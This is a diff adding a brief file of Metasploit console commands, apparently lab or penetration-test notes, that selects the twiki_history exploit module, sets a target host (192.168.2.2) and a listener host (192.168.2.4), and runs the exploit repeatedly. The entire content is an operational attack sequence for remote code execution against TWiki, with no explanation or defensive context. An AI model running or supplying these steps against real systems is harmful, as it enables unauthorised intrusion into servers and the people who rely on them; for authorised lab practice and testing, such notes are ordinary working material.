@@ -1,0 +1,9 @@
+search twiki
+use 2
+
+use exploit/unix/webapp/twiki_history
+
+set RHOSTS 192.168.2.2
+set LHOST 192.168.2.4
+
+exploit (multiple Times)
